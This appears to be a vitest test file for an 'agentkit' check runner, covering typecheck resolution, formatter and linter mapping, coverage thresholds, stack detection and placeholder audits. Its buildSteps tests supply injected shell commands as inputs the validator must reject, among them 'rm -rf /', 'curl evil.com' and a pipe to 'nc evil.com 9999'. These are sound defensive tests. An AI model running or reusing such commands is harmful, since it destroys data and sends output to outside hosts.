/**
 * Coverage-targeted tests for check.mjs.
 * Focus: resolveTypecheckCommand (entirely uncovered), buildSteps warn paths,
 * loadCoverageThreshold, auditUnresolvedPlaceholders, detectStacks wildcard,
 * resolveFormatter / resolveLinter map entries, and runCheck advanced paths
 * (--fix, --coverage, command-not-found SKIP, placeholder findings,
 * appendEvent failure).
 *
 * See issue #520 (branch-coverage ratchet) for the broader context.
 */
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { resolve } from 'path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../runner.mjs', async () => {
  const actual = await vi.importActual('../runner.mjs');
  return {
    ...actual,
    commandExists: vi.fn(() => true),
    // Wrapped rather than replaced: almost every test here wants the real
    // implementation, but a test that forces commandExists to true needs to be
    // able to stub this, or the step it is exercising spawns whatever binary
    // the stack names. beforeEach restores the real implementation.
    execCommand: vi.fn(actual.execCommand),
  };
});

vi.mock('../agent-integration.mjs', async () => {
  const actual = await vi.importActual('../agent-integration.mjs');
  return {
    ...actual,
    resolveCoverageCommand: vi.fn(() => ({ command: null, parser: 'unknown' })),
    parseCoveragePercentage: vi.fn(() => null),
  };
});

const { commandExists, execCommand } = await import('../runner.mjs');
const actualRunner = await vi.importActual('../runner.mjs');
const { resolveCoverageCommand, parseCoveragePercentage } =
  await import('../agent-integration.mjs');
const {
  auditUnresolvedPlaceholders,
  buildSteps,
  detectStacks,
  loadCoverageThreshold,
  resolveFormatter,
  resolveLinter,
  resolveTypecheckCommand,
  runCheck,
} = await import('../check.mjs');

function makeFixture() {
  const root = mkdtempSync(resolve(tmpdir(), 'agentkit-check-cov-'));
  const agentkitRoot = resolve(root, '.agentkit');
  const projectRoot = resolve(root, 'project');
  mkdirSync(resolve(agentkitRoot, 'spec'), { recursive: true });
  mkdirSync(projectRoot, { recursive: true });
  return { root, agentkitRoot, projectRoot };
}

function cleanupFixture(root) {
  if (existsSync(root)) {
    rmSync(root, { recursive: true, force: true });
  }
}

beforeEach(() => {
  vi.mocked(commandExists).mockReset().mockReturnValue(true);
  vi.mocked(execCommand).mockReset().mockImplementation(actualRunner.execCommand);
  vi.mocked(resolveCoverageCommand)
    .mockReset()
    .mockReturnValue({ command: null, parser: 'unknown' });
  vi.mocked(parseCoveragePercentage).mockReset().mockReturnValue(null);
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe('resolveTypecheckCommand', () => {
  it('returns stack.typecheck unchanged for non-node stacks', () => {
    const stack = { name: 'rust', typecheck: 'cargo check' };
    expect(resolveTypecheckCommand(stack, '/anywhere')).toBe('cargo check');
  });

  it('returns stack.typecheck unchanged when projectRoot is missing', () => {
    const stack = { name: 'node', typecheck: 'tsc --noEmit' };
    expect(resolveTypecheckCommand(stack, undefined)).toBe('tsc --noEmit');
  });

  it('returns stack.typecheck unchanged when stack.typecheck is empty', () => {
    const stack = { name: 'node', typecheck: '' };
    expect(resolveTypecheckCommand(stack, '/anywhere')).toBe('');
  });

  it('returns stack.typecheck when package.json is missing', () => {
    const fx = makeFixture();
    try {
      const stack = { name: 'node', typecheck: 'tsc --noEmit' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('tsc --noEmit');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns stack.typecheck when scripts.typecheck is undefined', () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      const stack = { name: 'node', typecheck: 'tsc --noEmit' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('tsc --noEmit');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns stack.typecheck when scripts.typecheck is non-string', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 42 } }),
        'utf-8'
      );
      const stack = { name: 'node', typecheck: 'tsc --noEmit' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('tsc --noEmit');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns stack.typecheck when scripts.typecheck is whitespace-only', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: '   ' } }),
        'utf-8'
      );
      const stack = { name: 'node', typecheck: 'tsc --noEmit' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('tsc --noEmit');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns the script body directly for `node -e` one-liners', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'node -e "console.log(1)"' } }),
        'utf-8'
      );
      const stack = { name: 'node', typecheck: 'tsc --noEmit' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('node -e "console.log(1)"');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('prefers pnpm when pnpm-lock.yaml is present and pnpm exists', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'tsc' } }),
        'utf-8'
      );
      writeFileSync(resolve(fx.projectRoot, 'pnpm-lock.yaml'), '', 'utf-8');
      vi.mocked(commandExists).mockImplementation((cmd) => cmd === 'pnpm');
      const stack = { name: 'node', typecheck: 'tsc' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('pnpm run typecheck');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('uses npm when only package-lock.json + npm are available', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'tsc' } }),
        'utf-8'
      );
      writeFileSync(resolve(fx.projectRoot, 'package-lock.json'), '{}', 'utf-8');
      vi.mocked(commandExists).mockImplementation((cmd) => cmd === 'npm');
      const stack = { name: 'node', typecheck: 'tsc' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('npm run typecheck');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('uses yarn when yarn.lock + yarn are available', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'tsc' } }),
        'utf-8'
      );
      writeFileSync(resolve(fx.projectRoot, 'yarn.lock'), '', 'utf-8');
      vi.mocked(commandExists).mockImplementation((cmd) => cmd === 'yarn');
      const stack = { name: 'node', typecheck: 'tsc' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('yarn typecheck');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('falls back to any-available pnpm when no lockfile is present', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'tsc' } }),
        'utf-8'
      );
      vi.mocked(commandExists).mockImplementation((cmd) => cmd === 'pnpm');
      const stack = { name: 'node', typecheck: 'tsc' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('pnpm run typecheck');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('falls back to npm when no lockfile is present and pnpm is unavailable', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'tsc' } }),
        'utf-8'
      );
      vi.mocked(commandExists).mockImplementation((cmd) => cmd === 'npm');
      const stack = { name: 'node', typecheck: 'tsc' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('npm run typecheck');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('falls back to yarn when no lockfile is present and only yarn is available', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'tsc' } }),
        'utf-8'
      );
      vi.mocked(commandExists).mockImplementation((cmd) => cmd === 'yarn');
      const stack = { name: 'node', typecheck: 'tsc' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('yarn typecheck');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('falls back to stack.typecheck when no package manager is available', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.projectRoot, 'package.json'),
        JSON.stringify({ scripts: { typecheck: 'tsc' } }),
        'utf-8'
      );
      vi.mocked(commandExists).mockReturnValue(false);
      const stack = { name: 'node', typecheck: 'tsc' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('tsc');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns stack.typecheck when package.json contains broken JSON', () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{ not valid json', 'utf-8');
      const stack = { name: 'node', typecheck: 'tsc --noEmit' };
      expect(resolveTypecheckCommand(stack, fx.projectRoot)).toBe('tsc --noEmit');
    } finally {
      cleanupFixture(fx.root);
    }
  });
});

describe('buildSteps — warning paths', () => {
  it('warns and skips a non-string formatter value', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', formatter: 123 };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'format')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('non-string formatter'));
  });

  it('warns and skips a whitespace-only formatter (caught by trim guard)', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    // Whitespace-only passes typeof but trim() is empty — same code path
    // as the non-string warning, before resolveFormatter is called.
    const stack = { name: 't', formatter: '   ' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'format')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('non-string formatter'));
  });

  it('warns and skips a formatter with shell metacharacters', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', formatter: 'rm -rf $HOME' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'format')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('invalid formatter command'));
  });

  it('warns and skips an unrecognized formatter base', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', formatter: 'arbitrary-formatter' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'format')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('unrecognized formatter'));
  });

  it('warns and skips a linter resolving to an invalid command', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', linter: 'eslint && rm -rf /' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'lint')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('invalid linter command'));
  });

  it('warns and skips an unrecognized linter base', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', linter: 'arbitrary-lint' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'lint')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('unrecognized linter'));
  });

  it('warns and skips an invalid typecheck command', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', typecheck: 'tsc; rm -rf /' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'typecheck')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('invalid typecheck command'));
  });

  it('warns and skips an invalid test command', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', testCommand: 'pytest && curl evil.com' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'test')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('invalid test command'));
  });

  it('warns and skips an invalid build command', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const stack = { name: 't', buildCommand: 'cargo build | nc evil.com 9999' };
    const steps = buildSteps(stack, {}, '/dev/null');
    expect(steps.find((s) => s.name === 'build')).toBeUndefined();
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('invalid build command'));
  });

  it('attaches fixCommand when --fix flag is set and resolved.fix is available', () => {
    const stack = { name: 't', formatter: 'black' };
    const steps = buildSteps(stack, { fix: true }, '/dev/null');
    const formatStep = steps.find((s) => s.name === 'format');
    expect(formatStep.command).toBe('black --check .');
    expect(formatStep.fixCommand).toBe('black .');
  });

  it('omits fixCommand when --fix is set but resolved.fix is null (e.g. pylint)', () => {
    const stack = { name: 't', linter: 'pylint' };
    const steps = buildSteps(stack, { fix: true }, '/dev/null');
    const lintStep = steps.find((s) => s.name === 'lint');
    expect(lintStep.command).toBe('pylint .');
    expect(lintStep.fixCommand).toBeNull();
  });
});

describe('resolveFormatter — additional map entries', () => {
  it('maps `cargo fmt` to its check/fix variants', () => {
    const r = resolveFormatter('cargo fmt');
    expect(r.cmd).toBe('cargo fmt');
    expect(r.check).toBe('cargo fmt -- --check');
    expect(r.fix).toBe('cargo fmt');
  });

  it('maps `dotnet format` to its check/fix variants', () => {
    const r = resolveFormatter('dotnet format');
    expect(r.cmd).toBe('dotnet format');
    expect(r.check).toBe('dotnet format --verify-no-changes');
    expect(r.fix).toBe('dotnet format');
  });

  it('uses default prettier path when agentkitRoot is omitted', () => {
    const r = resolveFormatter('prettier');
    expect(r.check).toContain('.agentkit/node_modules/prettier/bin/prettier.cjs');
  });
});

describe('resolveLinter — additional map entries', () => {
  it('maps `cargo clippy` to its check/fix variants', () => {
    const r = resolveLinter('cargo clippy');
    expect(r.check).toBe('cargo clippy');
    expect(r.fix).toBe('cargo clippy --fix');
  });

  it('maps `flake8` to a null fix command', () => {
    const r = resolveLinter('flake8');
    expect(r.check).toBe('flake8 .');
    expect(r.fix).toBeNull();
  });
});

describe('loadCoverageThreshold', () => {
  it('returns null when project.yaml is missing', () => {
    const fx = makeFixture();
    try {
      expect(loadCoverageThreshold(fx.agentkitRoot)).toBeNull();
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns null when testing.coverage is undefined', () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.agentkitRoot, 'spec', 'project.yaml'), 'project: {}\n', 'utf-8');
      expect(loadCoverageThreshold(fx.agentkitRoot)).toBeNull();
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns null when testing.coverage is non-numeric', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'project.yaml'),
        'testing:\n  coverage: "eighty"\n',
        'utf-8'
      );
      expect(loadCoverageThreshold(fx.agentkitRoot)).toBeNull();
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns the configured numeric threshold', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'project.yaml'),
        'testing:\n  coverage: 75\n',
        'utf-8'
      );
      expect(loadCoverageThreshold(fx.agentkitRoot)).toBe(75);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('returns null when project.yaml is unparseable', () => {
    const fx = makeFixture();
    try {
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'project.yaml'),
        ': : not yaml at all',
        'utf-8'
      );
      expect(loadCoverageThreshold(fx.agentkitRoot)).toBeNull();
    } finally {
      cleanupFixture(fx.root);
    }
  });
});

describe('detectStacks', () => {
  it('returns [] when teams.yaml is missing', async () => {
    const fx = makeFixture();
    try {
      const stacks = await detectStacks(fx.agentkitRoot, fx.projectRoot);
      expect(stacks).toEqual([]);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('matches stacks via wildcard detect markers', async () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'main.py'), 'print(1)', 'utf-8');
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'teams.yaml'),
        'techStacks:\n  - name: python\n    detect: ["*.py"]\n',
        'utf-8'
      );
      const stacks = await detectStacks(fx.agentkitRoot, fx.projectRoot);
      expect(stacks.map((s) => s.name)).toContain('python');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('does not match a wildcard when no extension matches', async () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'README.md'), '# nothing', 'utf-8');
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'teams.yaml'),
        'techStacks:\n  - name: python\n    detect: ["*.py"]\n',
        'utf-8'
      );
      const stacks = await detectStacks(fx.agentkitRoot, fx.projectRoot);
      expect(stacks).toEqual([]);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('skips stacks without an array detect field', async () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'teams.yaml'),
        'techStacks:\n  - name: malformed\n    detect: "package.json"\n',
        'utf-8'
      );
      const stacks = await detectStacks(fx.agentkitRoot, fx.projectRoot);
      expect(stacks).toEqual([]);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('ignores non-string detect markers', async () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'teams.yaml'),
        'techStacks:\n  - name: weird\n    detect: [42, null]\n  - name: good\n    detect: ["package.json"]\n',
        'utf-8'
      );
      const stacks = await detectStacks(fx.agentkitRoot, fx.projectRoot);
      expect(stacks.map((s) => s.name)).toEqual(['good']);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('honors the filterStack parameter', async () => {
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'teams.yaml'),
        'techStacks:\n  - name: a\n    detect: ["package.json"]\n  - name: b\n    detect: ["package.json"]\n',
        'utf-8'
      );
      const stacks = await detectStacks(fx.agentkitRoot, fx.projectRoot, 'b');
      expect(stacks.map((s) => s.name)).toEqual(['b']);
    } finally {
      cleanupFixture(fx.root);
    }
  });
});

describe('auditUnresolvedPlaceholders', () => {
  it('returns [] when no output dirs exist', async () => {
    const fx = makeFixture();
    try {
      const findings = await auditUnresolvedPlaceholders(fx.projectRoot, ['.claude', '.cursor']);
      expect(findings).toEqual([]);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('finds {{variable}} placeholders in markdown files', async () => {
    const fx = makeFixture();
    try {
      const dir = resolve(fx.projectRoot, '.claude');
      mkdirSync(dir, { recursive: true });
      writeFileSync(resolve(dir, 'rules.md'), '# {{title}}\n\nWritten by {{author}}.\n', 'utf-8');
      const findings = await auditUnresolvedPlaceholders(fx.projectRoot, ['.claude']);
      expect(findings).toHaveLength(1);
      expect(findings[0].variables.sort()).toEqual(['author', 'title']);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('deduplicates repeated variables in the same file', async () => {
    const fx = makeFixture();
    try {
      const dir = resolve(fx.projectRoot, '.claude');
      mkdirSync(dir, { recursive: true });
      writeFileSync(resolve(dir, 'a.md'), 'Hello {{user}}, welcome {{user}}!', 'utf-8');
      const findings = await auditUnresolvedPlaceholders(fx.projectRoot, ['.claude']);
      expect(findings[0].variables).toEqual(['user']);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('ignores Handlebars-style block helpers', async () => {
    const fx = makeFixture();
    try {
      const dir = resolve(fx.projectRoot, '.claude');
      mkdirSync(dir, { recursive: true });
      writeFileSync(resolve(dir, 'block.md'), '{{#if cond}}A{{else}}B{{/if}}', 'utf-8');
      const findings = await auditUnresolvedPlaceholders(fx.projectRoot, ['.claude']);
      expect(findings).toEqual([]);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('skips node_modules and .git directories', async () => {
    const fx = makeFixture();
    try {
      const claudeDir = resolve(fx.projectRoot, '.claude');
      mkdirSync(resolve(claudeDir, 'node_modules', 'pkg'), { recursive: true });
      mkdirSync(resolve(claudeDir, '.git'), { recursive: true });
      writeFileSync(resolve(claudeDir, 'node_modules', 'pkg', 'README.md'), '{{ignored}}', 'utf-8');
      writeFileSync(resolve(claudeDir, '.git', 'HEAD.md'), '{{ignored}}', 'utf-8');
      writeFileSync(resolve(claudeDir, 'real.md'), '{{found}}', 'utf-8');

      const findings = await auditUnresolvedPlaceholders(fx.projectRoot, ['.claude']);
      expect(findings).toHaveLength(1);
      expect(findings[0].variables).toEqual(['found']);
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('skips files with non-supported extensions', async () => {
    const fx = makeFixture();
    try {
      const dir = resolve(fx.projectRoot, '.claude');
      mkdirSync(dir, { recursive: true });
      writeFileSync(resolve(dir, 'binary.png'), '{{ignored}}', 'utf-8');
      writeFileSync(resolve(dir, 'real.yaml'), 'name: {{found}}', 'utf-8');

      const findings = await auditUnresolvedPlaceholders(fx.projectRoot, ['.claude']);
      expect(findings).toHaveLength(1);
      expect(findings[0].file).toContain('real.yaml');
    } finally {
      cleanupFixture(fx.root);
    }
  });

  it('stops recursion after 5 levels deep', async () => {
    const fx = makeFixture();
    try {
      // Create 7 levels of nesting under .claude
      let dir = resolve(fx.projectRoot, '.claude');
      mkdirSync(dir, { recursive: true });
      for (let i = 0; i < 7; i++) {
        dir = resolve(dir, `lvl${i}`);
        mkdirSync(dir, { recursive: true });
      }
      writeFileSync(resolve(dir, 'deep.md'), '{{too_deep}}', 'utf-8');

      const findings = await auditUnresolvedPlaceholders(fx.projectRoot, ['.claude']);
      expect(findings).toEqual([]);
    } finally {
      cleanupFixture(fx.root);
    }
  });
});

describe('runCheck — advanced flag paths', () => {
  function writeStack(agentkitRoot, content) {
    writeFileSync(resolve(agentkitRoot, 'spec', 'teams.yaml'), content, 'utf-8');
  }

  it('records userContext when flags._args are provided', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    testCommand: \'node -e ""\'\n'
      );
      const result = await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: { _args: ['focus', 'on', 'auth'] },
      });
      expect(result.userContext).toBe('focus on auth');
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);

  it('marks a step as SKIP when its base command is missing', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    vi.mocked(commandExists).mockImplementation((cmd) => cmd !== 'definitely-missing-bin');

    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    testCommand: "definitely-missing-bin"\n'
      );
      const result = await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: {},
      });
      const step = result.stacks[0].steps.find((s) => s.step === 'test');
      expect(step.status).toBe('SKIP');
      expect(step.exitCode).toBe(-1);
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);

  it('triggers coverage when a threshold is configured (PASS path)', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    vi.mocked(resolveCoverageCommand).mockReturnValue({
      command: 'node -e ""',
      parser: 'vitest',
    });
    vi.mocked(parseCoveragePercentage).mockReturnValue(85.5);

    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    testCommand: \'node -e ""\'\n'
      );
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'project.yaml'),
        'testing:\n  coverage: 80\n',
        'utf-8'
      );

      const result = await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: {},
      });
      expect(result.coverage).toHaveLength(1);
      expect(result.coverage[0].status).toBe('PASS');
      expect(result.coverage[0].percentage).toBe(85.5);
      expect(result.coverage[0].threshold).toBe(80);
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);

  it('triggers coverage and marks FAIL when below threshold', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    vi.mocked(resolveCoverageCommand).mockReturnValue({
      command: 'node -e ""',
      parser: 'vitest',
    });
    vi.mocked(parseCoveragePercentage).mockReturnValue(50);

    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    testCommand: \'node -e ""\'\n'
      );
      writeFileSync(
        resolve(fx.agentkitRoot, 'spec', 'project.yaml'),
        'testing:\n  coverage: 80\n',
        'utf-8'
      );

      const result = await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: { coverage: true },
      });
      expect(result.coverage[0].status).toBe('FAIL');
      expect(result.overallStatus).toBe('FAIL');
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);

  it('marks coverage step SKIP when percentage cannot be parsed', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    vi.mocked(resolveCoverageCommand).mockReturnValue({
      command: 'node -e ""',
      parser: 'vitest',
    });
    vi.mocked(parseCoveragePercentage).mockReturnValue(null);

    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    testCommand: \'node -e ""\'\n'
      );
      const result = await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: { coverage: true },
      });
      expect(result.coverage[0].status).toBe('SKIP');
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);

  it('passes coverage when no threshold is configured but --coverage is requested', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    vi.mocked(resolveCoverageCommand).mockReturnValue({
      command: 'node -e ""',
      parser: 'vitest',
    });
    vi.mocked(parseCoveragePercentage).mockReturnValue(72);

    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    testCommand: \'node -e ""\'\n'
      );
      const result = await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: { coverage: true },
      });
      expect(result.coverage[0].status).toBe('PASS');
      expect(result.coverage[0].threshold).toBeNull();
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);

  it('prints unresolved-placeholder findings when generated files contain {{vars}}', async () => {
    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);

    const fx = makeFixture();
    try {
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      const claudeDir = resolve(fx.projectRoot, '.claude');
      mkdirSync(claudeDir, { recursive: true });
      writeFileSync(resolve(claudeDir, 'rules.md'), '{{leftover}}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    testCommand: \'node -e ""\'\n'
      );
      await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: {},
      });
      const out = log.mock.calls.map((c) => c.join(' ')).join('\n');
      expect(out).toContain('Unresolved Placeholders');
      expect(out).toContain('leftover');
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);

  it('runs --fix command before the check command when fixCommand is defined', async () => {
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    vi.mocked(commandExists).mockReturnValue(true);

    // The assertion below is about which steps get built, not about formatting
    // anything, so nothing here needs a real process. Stubbing the runner is
    // what keeps that true: `black` is a real binary, and mocking commandExists
    // to true removes the skip-not-found guard that would otherwise stop it
    // being spawned. On a machine with black installed, the step therefore ran
    // `black .` and `black --check .` for real — two Python interpreter
    // startups against this test's 20s budget, which is why it failed under
    // full-suite load while passing in isolation. execCommand's own default
    // timeout is 300s, so it could never have rescued the shorter test budget.
    vi.mocked(execCommand).mockReturnValue({
      exitCode: 0,
      stdout: '',
      stderr: '',
      durationMs: 0,
    });

    const fx = makeFixture();
    try {
      // Use black formatter so resolveFormatter returns a fix command,
      // but commandExists is mocked → skip-not-found path is avoided.
      writeFileSync(resolve(fx.projectRoot, 'package.json'), '{}', 'utf-8');
      writeStack(
        fx.agentkitRoot,
        'techStacks:\n  - name: t\n    detect: ["package.json"]\n    formatter: "black"\n    testCommand: \'node -e ""\'\n'
      );
      const result = await runCheck({
        agentkitRoot: fx.agentkitRoot,
        projectRoot: fx.projectRoot,
        flags: { fix: true },
      });
      // Both format and test steps should be present
      expect(result.stacks[0].steps.map((s) => s.step)).toEqual(
        expect.arrayContaining(['format', 'test'])
      );

      // The name of this test promises an ordering, which the assertion above
      // does not check — it passes whenever both steps merely exist. Now that
